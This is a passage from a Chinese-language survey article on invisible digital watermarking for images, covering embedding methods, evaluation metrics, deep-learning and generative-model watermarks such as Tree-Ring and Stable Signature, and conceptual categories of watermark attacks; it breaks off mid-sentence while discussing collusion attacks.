        <content type="html"><![CDATA[<h1 id="1-摘要"><a href="#1-摘要" class="headerlink" title="1 摘要"></a>1 摘要</h1><p>随着数字内容的广泛传播，数字水印技术作为保护版权的重要手段得到了广泛关注。隐式数字水印（Invisible Watermarking）技术通过在媒体文件中嵌入信息而不影响其可视质量，成为一种有效的版权保护方案。这种水印不仅可以传递版权信息，还可以用于内容追踪和身份验证，极大地增强了数字内容的安全性。本文综述了针对图像、音频和视频的隐式数字水印常见生成技术和攻击技术，探讨了水印的鲁棒性及其在各种应用场景中的重要性。未来，随着人工智能和区块链技术的发展，隐式数字水印的应用前景将更加广阔。因此，深入研究其生成和攻击技术的改进将是一个重要的研究方向。</p><hr><h1 id="2-引言"><a href="#2-引言" class="headerlink" title="2 引言"></a>2 引言</h1><p>过去几年，以网络视频为代表的泛网络视听领域的崛起，是互联网经济飞速发展最为夺目的大事件之一。泛网络视听领域不仅是21世纪以来互联网领域的重要基础应用、大众文化生活的主要载体，而且在推动中国经济新旧动能转化方面也发挥了重要作用。据中国网络视听节目服务协会发布的《2021年中国网络视听发展研究报告》显示，截至2020年12月，我国网络视听用户规模达9.44亿，2020年泛网络视听产业规模破6000亿元。然而，自泛网络视听诞生之初，盗版如同一颗毒瘤一样蔓延滋长，危害与日俱增，加强网络版权保护，任务紧迫而艰巨。</p><p>版权保护技术是指针对盗版侵权行为的确权存证以及监测、取证等技术。当前，区块链、人工智能、数字水印等版权保护应用主要集中在版权确权、监测、取证等环节；其中数字水印技术在版权确权、版权监测环节有着重要应用价值，数字水印具有查找侵权、追根溯源的能力，相比其他技术可以进一步实现对侵权行为的追踪溯源。</p><p>数字水印技术是将版权信息、唯一标识信息等以可见或不可见的方式嵌入数字作品载体中，用于证明作品来源。其中不可见的隐藏水印，具有肉眼不可发现但算法可以检测的特性，能够抵抗一定程度的剪切、拼接和编辑等操作。然而，随着盗版技术的不断升级，传统隐藏水印技术在复杂攻击场景中的鲁棒性面临着更加艰巨的挑战。攻击者可以通过复杂多样的编辑处理技术破坏被保护载体中所隐藏的版权信息，使得版权水印提取失效。</p><p>因此，数字水印技术的研究和发展迫在眉睫。未来的水印技术需要在鲁棒性、安全性和隐蔽性之间找到更好的平衡，以应对不断演变的盗版手段。同时，结合人工智能和区块链等新兴技术，将为数字水印的应用提供新的思路。</p><hr><h1 id="3-设计过程"><a href="#3-设计过程" class="headerlink" title="3 设计过程"></a>3 设计过程</h1><p>无论是基于传统方法还是基于深度学习的数字水印技术，一个完整的数字水印系统的设计一般包括三部分：水印生成、水印嵌入和水印提取。</p><h2 id="3-1-水印生成"><a href="#3-1-水印生成" class="headerlink" title="3.1 水印生成"></a>3.1 水印生成</h2><p>水印信号可以通过多种方式生成，例如利用伪随机序列发生器或混沌系统，或是有意义的二值、灰度或彩色图像。通常为了携带更多的版权信息，人们倾向于使用二值图像或灰度图像来表示水印，例如产品序列号或图标等。对于有意义的水印序列，为了增强水印信息的安全性并提高其抵抗恶意攻击的能力，可以使用置乱技术对水印进行预处理，以消除水印信息之间的相关性。</p><h2 id="3-2-水印嵌入"><a href="#3-2-水印嵌入" class="headerlink" title="3.2 水印嵌入"></a>3.2 水印嵌入</h2><p>水印嵌入是将水印信息嵌入到载体图像中的过程，它可以通过不同的技术和算法实现。在嵌入的过程中，水印信息被融合进载体图像的特定区域，使其在视觉上不易察觉。嵌入过程如图3.1所示。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_Fk07EaQjho.png"></p><center>图3.1  水印嵌入过程</center><h2 id="3-3-水印提取"><a href="#3-3-水印提取" class="headerlink" title="3.3 水印提取"></a>3.3 水印提取</h2><p>水印提取是从载体图像中提取水印信息的过程，它涉及使用特定的算法来从图像中提取已嵌入的水印，这些算法会根据水印嵌入的方式采取相应的措施。水印提取过程如图3.2所示。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_1_Cae0ZPg1Ut.png"></p><center>图3.2  水印提取过程</center><hr><h1 id="4-技术背景"><a href="#4-技术背景" class="headerlink" title="4 技术背景"></a>4 技术背景</h1><p>在探讨数字水印技术的具体应用之前，了解其技术背景至关重要。本节将深入分析数字水印的相关技术概念。</p><h2 id="4-1-隐写术（Steganography）"><a href="#4-1-隐写术（Steganography）" class="headerlink" title="4.1 隐写术（Steganography）"></a>4.1 隐写术（Steganography）</h2><p>隐写术一般指的是向图像或者视频等信息载体中嵌入隐秘信息，其中大部分隐写术算法都是基于空域等知识进行信息嵌入。近年来图像隐写术的发展也是层出不穷，从最早期的LSB、LSB-Match到内容自适应隐写术：HUGO$^{\mathrm{[1]}}$（空域自适应隐写算法）、WOW$^{\mathrm{[2]}}$、SUNIWARD$^{\mathrm{[3]}}$，再到如今的深度学习隐写术。隐写术算法已经可以自动的将隐秘信息嵌入到纹理、噪声丰富的图像区域，并保持复杂的图像高阶统计特性。</p><h2 id="4-2-隐写分析（Steganalysis）"><a href="#4-2-隐写分析（Steganalysis）" class="headerlink" title="4.2 隐写分析（Steganalysis）"></a>4.2 隐写分析（Steganalysis）</h2><p>隐写分析是通过对图像的统计特性进行分析，判断图像中是否隐藏有额外的信息甚至估计信息嵌入量、获取隐藏信息内容的技术。目前的隐写分析研究领域通常将隐写分析看成一个二分类问题，目标是区分载体图像和载密图像。图4.1展示了一个隐写分析的例子（图例来自数据集BOSSbase_1.0.1），左图为载体图像，中间为载密图像，右图为差异图像（载体图像与载密图像之间的差异图像）。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_gu-Y_hk24m.jpeg"></p><center>图4.1  隐写分析示例</center><p>隐写分析方法一般分为两类。一类是基于传统特征的图像隐写分析方法，这一类方法主要包含特征提取、特征增强和特征分类器三部分；其中特征提取与增强部分对于后面训练分类器有着决定性的作用，且特征选择非常依赖于人工，存在耗时长、鲁棒性差等缺陷，代表的隐写分析模型有SPAM$^{\mathrm{[4]}}$、SRM$^{\mathrm{[5]}}$、DCTR$^{\mathrm{[6]}}$等。</p><p>另一类方法是基于深度学习的隐写分析方法，模型主要分为半学习模型和全学习模型。半学习模型依靠SRM的30个滤波核作为预处理层来进行网络的学习，代表的网络有Xu-Net$^{\mathrm{[7]}}$、Ye-Net$^{\mathrm{[8]}}$等。全学习模型则完全依靠深度神经网络强大的学习能力从纷繁复杂的像素信息中学习到重要的残差特征信息，代表的深度网络SRNet$^{\mathrm{[9]}}$等。全学习深度网络在检测精度上要优于半学习深度网络并且更具有鲁棒性。</p><h2 id="4-3-数字水印（Digital-WaterMarking）"><a href="#4-3-数字水印（Digital-WaterMarking）" class="headerlink" title="4.3 数字水印（Digital WaterMarking）"></a>4.3 数字水印（Digital WaterMarking）</h2><p>数字水印技术是指将特定的编码信息嵌入到数字信号中，数字信号可能是音频、图像或是视频等。若要拷贝有数字水印的信号，所嵌入的信息也会一并被拷贝。数字水印技术是一种基于内容的、非密码机制的计算机信息隐藏技术，是保护信息安全、实现防伪溯源、版权保护的有效办法。数字水印一般分为明水印和隐藏水印。隐藏水印通过在载体数据（音频、视频等）中添加隐藏标记，在一般情况下无法被人眼以及机器所辨识。隐藏水印的重要应用之一就是保护著作权，期望能借此避免或阻止数字媒体未经授权的复制和拷贝。</p><h2 id="4-4-水印检测（Watermark-Detection）"><a href="#4-4-水印检测（Watermark-Detection）" class="headerlink" title="4.4 水印检测（Watermark Detection）"></a>4.4 水印检测（Watermark Detection）</h2><p>隐藏水印信息检测的方法一般有两种。一种是基于自相关的检测方法，这种方法是根据水印嵌入算法提出的相关函数生成对应的检测算法，另一种则是利用模版匹配的方法，该方法利用图像处理中模板匹配的思想，在添加水印时制定一个模板，通过模板来添加水印；在检测水印时，在待测图像上使用模板进行相似度计算；当相似度超过设定的阈值时便认定检出水印，反之则无水印。</p><hr><h1 id="5-评估指标"><a href="#5-评估指标" class="headerlink" title="5 评估指标"></a>5 评估指标</h1><p>数字水印算法有多种评估标准，主要有以下三个标准：不可感知性、鲁棒性和容量。</p><h2 id="5-1-不可感知性"><a href="#5-1-不可感知性" class="headerlink" title="5.1 不可感知性"></a>5.1 不可感知性</h2><p>不可感知性指的是载体嵌入水印前后不会引起感知上的明显变化。当评估数字水印算法的不可感知性时，常用的指标是结构相似性指标（SSIM）和峰值信噪比（PSNR）。</p><p>SSIM衡量两幅图像之间的结构相似性，考虑了亮度、对比度和结构三个方面的相似度。其数学表达式为：</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image.png"></p><p>其中$x$和$y$分别代表两幅图像，和分别是$x$和$y$的均值，和分别是它们的方差，是它们的协方差，$c_{\mathrm{1}}$和$c_{\mathrm{2}}$是为了稳定性而加入的常数。</p><p>而 PSNR（峰值信噪比）则用于衡量图像的质量损失程度，其数学表达式为：</p><p>$$<br>\operatorname{PSNR}&#x3D;10 \cdot \log _{10}\left(\frac{\mathrm{MAX}^{2}}{\mathrm{MSE}}\right) \quad \quad (5.2)<br>$$</p><p>其中，MAX（极限值）是图像的最大可能像素值，MSE（均方误差）代表图像之间的均方误差。</p><p>这两个指标常用来评估数字水印算法对图像质量的影响，一般来说，较高的SSIM和较高的PSNR值表示水印嵌入对图像质量的影响较小，即水印图像的不可感知性较好。</p><h2 id="5-2-鲁棒性"><a href="#5-2-鲁棒性" class="headerlink" title="5.2 鲁棒性"></a>5.2 鲁棒性</h2><p>鲁棒性是指数字水印算法抵抗各种攻击的能力，例如JPEG压缩、旋转、剪切、添加噪声等。使用鲁棒性强的水印算法嵌入水印的图像在经历多种攻击后，在提取水印信息时依然有较高的提取成功率。评估鲁棒性常用的指标包括错误率、提取成功率等。</p><h2 id="5-3-容量"><a href="#5-3-容量" class="headerlink" title="5.3 容量"></a>5.3 容量</h2><p>图像水印容量指的是在载体图像中可以隐藏的最大水印信息量。它的大小受多种因素影响，包括载体图像的统计特性、失真限度，以及水印嵌入和提取算法是否能够充分利用载体图像。不同的应用场景对水印容量有着不同的需求和限制。</p><h2 id="5-4-性能指标之间的关系"><a href="#5-4-性能指标之间的关系" class="headerlink" title="5.4 性能指标之间的关系"></a>5.4 性能指标之间的关系</h2><p>数字水印的鲁棒性、不可感知性和容量之间存在一种相互制约的关系，这种关系可以通过图5.1进行展示。当三者中的任何一个参数被固定时，剩下的两个参数之间会存在矛盾。举例来说，若水印容量被设定为一定数值，为了提高水印的鲁棒性，可能需要增加水印的嵌入强度，而这样必然会导致更大的图像失真。同理，若降低水印的嵌入强度以保证较好的图像质量，那么水印的鲁棒性就可能会降低。因此，在设计水印算法时，常常需要在水印鲁棒性、不可感知性和容量之间取得一种平衡，根据实际应用需求进行权衡处理。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_2_g6WBcozH_H.png"></p><center>图5.1  性能指标之间的关系</center><hr><h1 id="6-针对图像的数字水印生成和攻击"><a href="#6-针对图像的数字水印生成和攻击" class="headerlink" title="6 针对图像的数字水印生成和攻击"></a>6 针对图像的数字水印生成和攻击</h1><h2 id="6-1-传统图像数字水印生成方法"><a href="#6-1-传统图像数字水印生成方法" class="headerlink" title="6.1 传统图像数字水印生成方法"></a>6.1 传统图像数字水印生成方法</h2><p>传统数字水印方法通常基于信号处理、信息论和密码学的原理，通过手工设计的算法或规则实现水印嵌入和提取，分为空域和变换域方法。典型的算法有基于对称性的局部几何失真鲁棒水印。</p><p>（1）空域方法直接在原始图像中嵌入水印，例如修改像素值或调整图像的特定属性来隐藏信息。</p><p>（2）变换域方法则是在图像的变换域进行操作，比如在频域或小波域中嵌入水印。这些传统方法中的常用变换包括离散余弦变换（DCT）、离散小波变换（DWT）、离散傅里叶变换（DFT）、奇异值分解（SVD）等，它们各自有不同的优势和适用场景。</p><h2 id="6-2-深度学习图像数字水印生成方法"><a href="#6-2-深度学习图像数字水印生成方法" class="headerlink" title="6.2 深度学习图像数字水印生成方法"></a>6.2 深度学习图像数字水印生成方法</h2><p>深度学习水印算法是基于深度学习技术的新兴数字水印方法，与传统数字水印方法有所不同。传统方法基于信号处理、信息论和密码学，通过手工设计的算法实现水印的嵌入和提取，相比之下，深度学习水印算法利用神经网络等深度学习模型来处理水印信息。</p><p>现有的基于深度学习的水印方案主要使用的是E-N-D框架$^{\mathrm{[10]}}$。此类框架包含编码器（Encoder）、噪声层（Noise Layer）和解码器（Decoder）三个部分，如图6.1所示。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_3_Sdm2y7hmRw.png"></p><center>图6.1  深度学习水印的E-N-D框架$^{\mathrm{[11]}}$</center><p>编码器学习将水印消息嵌入到载体图像中，噪声层使带水印的图像失真，模拟真实信道中的失真过程，解码器则尝试从失真的图像中提取水印信息。在训练过程中，这三个组件共同进行联合训练，而在实际使用阶段，噪声层部分被真实的信道代替，仅使用编码器和解码器进行水印嵌入和提取。</p><p>E-N-D框架的设计允许模型通过不同的噪声层学习适应各种失真情况，从而增强了水印算法对不同干扰的鲁棒性。下面介绍2种基于E-N-D框架的典型算法。</p><h3 id="6-2-1-基于条件可逆神经网络的深度学习图像隐式水印"><a href="#6-2-1-基于条件可逆神经网络的深度学习图像隐式水印" class="headerlink" title="6.2.1 基于条件可逆神经网络的深度学习图像隐式水印"></a>6.2.1 基于条件可逆神经网络的深度学习图像隐式水印</h3><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_4_1KPYWflM1L.png"></p><center>图6.2  基于条件可逆神经网络的深度学习图像隐式水印$^{\mathrm{[12]}}$</center><p>利用可逆神经网络对于复杂高维密度建模的优秀性能，将基于流的归一化可逆神经网络与水印的嵌入提取过程相结合，实现了高效的水印提取和图像恢复，具体实现方法如图6.2所示。</p><p>（1）扩散与提取（DEM）</p><p>对于前向嵌入过程，DEM接受原始图像与水印信息作为输入，其中水印信息经过如下变换扩散到与图像相同的维度上，与经过Haar变换的原始图像一同输入到可逆网络模块。由于这部分的数据处理均为可逆，所以在水印提取过程中即可方便的经过逆运算重新得到输入。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image1.png"></p><p>（2）可逆网络（IM）</p><p>该模块接受连接后的原始图像和水印信息为输入，在可逆网络中的耦合层通过加性仿射变换将水印信息映射到符合在图像中嵌入水印要求的分布，以达到鲁棒嵌入和不可感知的目的。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image2.png"></p><p>（3）融合和分离（FSM）</p><p>可逆网络的输出可以分为两部分，舍弃输出的图像部分，仅保留映射后的水印信息，并将后者添加到原始图像中，得到最终的水印图像。同样的，该部分的可逆性允许从水印图像中恢复水印信息与图像。</p><p>$$<br>W I_{m}&#x3D;\Gamma_{\text {haar }}^{-1}\left(\Psi_{\text {inv }}^{I I}\left(x ; L R_{-}, H R_{-}\right) \times S+\Gamma_{\text {haar }}\left(I_{m}(x ; L R, H R)\right)\right) \quad \quad (6.4)<br>$$</p><p>（4）噪声层与不可逆提取</p><p>作为鲁棒水印的硬性要求，生成的水印图像在经过若干噪声层后对其水印信息应该保持良好的提取率，以上可逆网络中水印的嵌入和提取具有确定性的映射关系，这使得在没有或有加性噪声的场景中水印提取精度得到良好的结果。然而，当受到有损压缩或复杂的非加性噪声时，可逆网络的前向和后向共享同一组参数，解码器的参数会随着编码器的更新而更新，这限制了解码器的能力应对复杂的噪音。</p><p>因此，框架中引入了一个额外的解码器，以增强对有损压缩噪声的鲁棒性。不可逆模块使用SENet作为主干来提取水印信息，并且额外训练了一个特定噪声选择模块（NSM），由此判断水印图像是否经过了有损压缩的噪声层，最终决定选择由可逆或不可逆网络提取出的水印消息为准。</p><h3 id="6-2-2-基于mini-bactch的深度学习图像隐式水印框架"><a href="#6-2-2-基于mini-bactch的深度学习图像隐式水印框架" class="headerlink" title="6.2.2 基于mini-bactch的深度学习图像隐式水印框架"></a>6.2.2 基于mini-bactch的深度学习图像隐式水印框架</h3><p>如图6.3所示，在端到端的基于深度学习的水印方案中，该模型$^{\mathrm{[13]}}$使用Encoder-Noise Layer-Decoder的三层结构。一共结构包括五个组件：</p><ol><li>参数为$\theta_M$的消息处理器MP接收长度为$L$的二进制秘密消息$M∈{0，1}^{\mathrm{L}}$，并输出消息特征映射$M_{e n} \in \mathbf{R}^{C^{\prime} \times H \times W}$，其中$C’$是特征地图的通道数；</li><li>参数为$\theta_E$的编码器$E$以$3×H×W$的形状接收RGB cover图像$I_{\mathrm{co}}$，消息特征映射$M_{\mathrm{en}}$作为输入，并对形状为$3×H×W$的编码图像$I_{\mathrm{en}}$进行乘积；</li><li>噪声层根据MBRS方法随机选取噪声。它接收$I_{\mathrm{en}}$并输出相同形状的噪声图像$I_{\mathrm{no}}$；</li><li>带有参数$\theta_D$的解码器$D$从噪声图像$I_{\mathrm{no}}$中恢复长度为$L$的秘密消息$M’$；</li><li>带有参数$\theta_A$的对手鉴别器$A$接收图像$I_{\mathrm{en}}$或$I_{\mathrm{co}}$以预测给定图像被编码的概率。</li></ol><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_5_yq-f93Eug3.png"></p><center>图6.3  MBRS水印结构框图</center><p>在上述过程中，透明性和鲁棒性是直接影响性能的两个方面。实现透明性的关键是在保证鲁棒性的前提下嵌入尽可能少的水印信号，换言之，嵌入器需仅嵌入解码器需要的信号。因此，核心问题是嵌入器与解码器能否高效耦合。实现鲁棒性的关键是噪声层的设计，噪声层中的失真决定了算法的鲁棒性。为了实现训练，一般要求噪声层可导，因此，对不可导失真（例如JPEG压缩）的噪声层设计是重要的难点问题。</p><p>然而，在端到端的结构中，对JPEG图像进行水印的嵌入时，JPEG压缩是信道传输中的常见失真，因此，MBRS的方法旨在训练一个抗JPEG压缩的基于深度学习的鲁棒水印方案。在学习JPEG压缩失真的过程中首要面对的挑战是JPEG压缩中存在不可导的量化过程，使得如果直接使用真实JPEG作为噪声层训练，产生的梯度不可回传，不能有效优化网络。在以往的工作中，尝试使用模拟JPEG信息代替真实JPEG信息保证梯度下降更新，但是模拟JPEG无法保证完全学习真实JPEG信息，因此在MBRS方法中希望引入真实JPEG信息而又可以正常反向传播计算梯度。</p><p>为了解决模拟JPEG损失和真实JPEG不可导失真的矛盾，MBRS方法提出使用mini-batch的策略，在每一个训练的小batch里随机从无失真（Identity），真实JPEG和模拟JPEG中选择一种作为噪声层，优化器选择带动量的Adam优化器，这样真实JPEG虽然不可回传梯度，但另两种失真却能通过优化器的特性保证大体的梯度回传方向。除了在噪声层使用mini-batch策略实现真实JPEG信息的学习，编码器和解码器阶段都采用基于SE-Net的框架。</p><p>算法整体流程如下：首先将待嵌入的水印消息通过预处理卷积层上采样到与图像隐藏层相同的大小，经过级联卷积后输出含水印图像。含水印图像传入噪声层中，在噪声层中采用上述mini-batch的策略随机在每一个batch中选择噪声层，以更好的鲁棒性训练。最后将选择较好的带噪声失真的含水印图像输入解码器。</p><h2 id="6-3-生成图像数字水印生成方法"><a href="#6-3-生成图像数字水印生成方法" class="headerlink" title="6.3 生成图像数字水印生成方法"></a>6.3 生成图像数字水印生成方法</h2><p>近两年生成模型的陆续发布和开源降低了用户利用AIGC造假的门槛，Facebook等主流的UGC内容平台上已经充斥着大量AI生成的多媒体信息。这些平台都有识别和追溯这些信息真实性的迫切需求。因此，最近提出了生成图像水印方法，将水印生成和水印嵌入过程合并到图像生成过程中。生成图像水印的嵌入不是发生在图像生成之后而是发生在图像生成过程中，这意味着实际样本并不带有经典加法意义上的水印，而是隐藏在图像分布中的水印。这类方法为内容平台追踪和验证信息真实性提供了一种新的可能性。</p><h3 id="6-3-1-针对扩散模型的鲁棒和不可见的树环水印"><a href="#6-3-1-针对扩散模型的鲁棒和不可见的树环水印" class="headerlink" title="6.3.1 针对扩散模型的鲁棒和不可见的树环水印"></a>6.3.1 针对扩散模型的鲁棒和不可见的树环水印</h3><p>与现有的在采样后对图像进行事后修改的方法不同，树环水印$^{\mathrm{[14]}}$（见图6.4）会微妙地影响整个采样过程，从而产生人类看不见的模型指纹。水印将一个模式嵌入到用于采样的初始噪声向量中。这些模式是在傅里叶空间中构造的，因此它们对卷积、裁剪、膨胀、翻转和旋转是不变的。在图像生成后，通过反扩散过程提取噪声向量来检测水印信号，然后对嵌入的信号进行检查。</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_6_AyUxHpMMBT.png"></p><center>图6.4  树环水印框架</center><p>由于直接将密钥输入高斯阵列可能会在生成的图像中产生明显的图案，该方法将密钥输入起始噪声矢量的傅立叶变换中。首先选择一个二元掩码，并对密钥进行采样，则初始化噪声矢量可以在傅里叶空间描述为：</p><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image4.png"></p><p>在检测时，给定图像$x_{\mathrm{0}}^{‘}$，模型所有者可以通过DDIM反演过程得到一个近似的初始噪声向量$x_{\mathrm{T}}^{\prime}: x_{\mathrm{T}}^{\prime}&#x3D;D_{\theta}^{\prime}(x_{0}^{\prime})$，最后的度量计算为在水印区域的傅里叶空间中噪声矢量与密钥之间的距离，即：</p><p>$$<br>d_{\text {detection distance }}&#x3D;\frac{1}{|M|} \sum_{i \in M}\left|k_{i}^{*}-\mathcal{F}\left(x_{T}^{\prime}\right)_{i}\right| \quad \quad (6.6)<br>$$</p><p>如果该值低于预设阈值，则检测到水印。</p><p>对于树环密钥的构造，该方法选择傅里叶空间中以低频模式为圆心，以为半径的圆形区域作为密钥区域。密钥在统计上应与高斯噪声相似，以避免非高斯密钥可能会导致的分布偏移，从而影响扩散模型的性能。</p><h3 id="6-3-2-针对Stable-Diffusion的高效水印算法Stable-Signature"><a href="#6-3-2-针对Stable-Diffusion的高效水印算法Stable-Signature" class="headerlink" title="6.3.2 针对Stable Diffusion的高效水印算法Stable Signature"></a>6.3.2 针对Stable Diffusion的高效水印算法Stable Signature</h3><p><img src="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_7_Jksgr2cuKm.png"></p><center>图6.5  Stable Signature的方法框架</center><p>Stable Signature算法$^{\mathrm{[15]}}$提出了一种主动防御策略。图6.5的红色部分是模型发布者Alice，蓝色部分是用户Bob。可以看到，仅仅通过微调LDM的VAE解码器，即可在生成图像中高效嵌入特定的二进制签名，同时保证生成图像的质量。预训练好的水印提取器恢复图像中隐藏的水印，通过一个统计测试可以用于检测和溯源，根据实际假阳率的要求来控制检测的阈值。</p><p><strong>检测场景：</strong>假设给某位用户Bob的模型签名时一个位的二进制序列，如果Alice利用水印提取器解码的签名和原来的有位以上匹配，则认为这张图片是Alice模型生成的。这里给出两个假设，备择假设说图片是Alice模型生成的，原假设说不是。如果不是Alice模型生成的，可以认为其解码的签名每一位都是独立同分布的Bernoul1i随机变量，这样匹配位数服从二项分布。可以推导出假阳率FPR的计算公式为在条件下匹配位数大于阈值的概率，也就是二项分布的累计分布函数。FPR可以使用不完全beta函数写出闭式解。</p><p><strong>溯源场景：</strong>假设位用户Bob的模型有不同的嵌入签名，需要进行次检测的假设检验，如果全部拒绝，那么图片不是由他们任何人生成的，否则把图片归属为匹配位数最多的用户。次测试的假阳性更多，所以全局FPR更高，在真实场景一般是给定要求的FPR，反过来确定阈值。</p><p>Stable Signature的训练分为两个阶段。第一阶段是预训练一个水印提取网络。首先使用经典水印算法HiDDeN模型编码一张图片和位二进制消息，经过常规的图像变换，然后解码出消息。由于在后续嵌入水印的微调过程中不需要水印编码器，在这个阶段只需要优化消息重构损失，不需要优化原有的感知损失和对抗网络。此外，由于一般图像的解码消息比特间相互关联且高度有偏，违背了前面的独立同分布假设，还需要通过一个PCA白化变换来去偏和去相关。</p><p>第二阶段是对给定的签名，微调LDM的VAE解码器。在这个阶段，水印提取器是冻结的，并且同上个阶段一样优化消息重构损失。为了保持图像的生成质量，在这个阶段还需要使用一个Watson-VGG感知损失来控制解码器与原解码器输出图像的失真程度，该方法使用平衡系数来平衡两部分损失。这一阶段的微调过程非常高效，训练小于500张图片只需要单卡1分钟的时间。该方法在LDM等多种生成模型上和DwtDct、SSL Watermark和HiDDeN等多种基线水印方法进行了比较，结果表明该方法的鲁棒性和不可见性与基线方法是可比的。</p><h2 id="6-4-图像数字水印常见攻击"><a href="#6-4-图像数字水印常见攻击" class="headerlink" title="6.4 图像数字水印常见攻击"></a>6.4 图像数字水印常见攻击</h2><p>水印攻击方法可以分为4类：健壮性攻击、表达攻击、解释攻击和合法攻击。其中前3类可归类为技术攻击，而合法攻击则完全不同，它是在水印方案所提供的技术特点或科学证据的范围之外进行的。在此，仅论述常见的前3类技术攻击方法和一些基本对策。</p><h3 id="6-4-1-健壮性攻击"><a href="#6-4-1-健壮性攻击" class="headerlink" title="6.4.1 健壮性攻击"></a>6.4.1 健壮性攻击</h3><p>健壮性攻击以减少或消除数字水印的存在为目的，包括像素值失真攻击、敏感性分析攻击和梯度下降攻击等。这些方法并不能将水印完全除去，但可能充分损坏水印信息。为抵抗这类攻击，总体要求水印算法是公开的，算法的安全性应依赖于与图像内容有关或无关的密钥及算法本身的特性。</p><p>（1）像素值失真攻击</p><p>像素值失真攻击是指对图像像素值的修改，可以分为信号处理攻击和分析攻击两种方法$^{\mathrm{[16]}}$。</p><p>信号处理攻击是通过对水印图像进行某种操作，以削弱或删除嵌入的水印，而不是试图识别或分离水印，这种攻击包括线性或非线性滤波、像压缩、添加噪声、图像量化、模数或数模转换等,造成像素值失真的4种基本攻击操作是：外加噪声、幅值变化、线性滤波和量化；其他的攻击操作可看作这4种基本方式的有机组合$^{\mathrm{[17]}}$。在这4种基本攻击操作中，线性相关检测对外加噪声以及归一化相关检测对幅值变化都是健壮的，而变阈值的优化检测方法对线性滤波和量化处理比相关检测具有更好的健壮性。</p><p>分析攻击是通过分析水印图像来估计图像中的水印，然后将水印从图像中分离出来并使水印检测失败。常见的例子是合谋攻击，它有两种基本类型：其一是攻击者拥有同一个原图像嵌入了不同水印的拷贝，通过取所有拷贝的均值或仅从每个拷贝中取一小部分，可得到一个检测不到水印的原图像的近似值$^{\mathrm{[18]}}$。其二是攻击者拥有嵌入了同一个水印的不同水印图像，对这些图像取均值并以这个均值作为